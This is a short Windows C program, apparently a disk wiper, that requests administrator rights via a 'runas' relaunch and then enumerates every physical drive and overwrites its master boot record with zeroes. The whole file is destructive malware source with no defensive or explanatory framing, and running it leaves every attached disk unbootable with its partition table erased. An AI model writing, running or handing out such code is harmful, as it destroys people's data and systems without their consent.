#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define MBR_SIZE 512 // MBR size is 512 bytes, where the bootloader and partition info are stored

// function to run the program with admin rights
void runAsAdmin() {
    // this sets up a new process to launch the program with admin permissions
    SHELLEXECUTEINFO ShExInfo = {0};
    ShExInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    ShExInfo.fMask = SEE_MASK_FLAG_DDEWAIT | SEE_MASK_FLAG_NO_UI;
    ShExInfo.hwnd = NULL;
    ShExInfo.lpVerb = "runas"; // asks for admin privileges
    ShExInfo.lpFile = GetCommandLine(); // uses the current command line to relaunch the program
    ShExInfo.lpParameters = NULL;
    ShExInfo.lpDirectory = NULL;
    ShExInfo.nShow = SW_NORMAL;

    // actually trying to run the program as admin
    if (!ShellExecuteEx(&ShExInfo)) {
        printf("couldn't get admin permissions\n"); // just in case it fails
    }
}

// function to write zeroes to the MBR of a drive
void write_zero_mbr(const char *device) {
    unsigned char buffer[MBR_SIZE] = {0}; // this is a buffer filled with zeroes

    // trying to open the physical drive to write to it
    HANDLE hDevice = CreateFileA(device, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        perror("failed to open drive"); // if it fails, print the error
        return;
    }

    // writing the zeroes to the drive's MBR
    WriteFile(hDevice, buffer, MBR_SIZE, NULL, NULL);
    CloseHandle(hDevice); // don't forget to close the handle when done

    printf("zeroes written to mbr of %s\n", device); // let the user know it's done
}

// function to find and write zeroes to all connected physical drives
void detect_windows_drives() {
    for (int i = 0; ; i++) {
        char device[16];
        snprintf(device, sizeof(device), "\\\\.\\PhysicalDrive%d", i); // builds the device path (like \\.\PhysicalDrive0)

        // check if the drive exists by trying to open it
        HANDLE hDevice = CreateFileA(device, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hDevice == INVALID_HANDLE_VALUE) {
            break; // if it doesn't exist, exit the loop
        }

        CloseHandle(hDevice); // close the handle if it's valid
        write_zero_mbr(device); // write zeroes to the MBR of this drive
    }
}

int main() {
    runAsAdmin(); // get admin permissions to write to drives
    detect_windows_drives(); // find all drives and overwrite their MBRs with zeroes
    return 0;
}
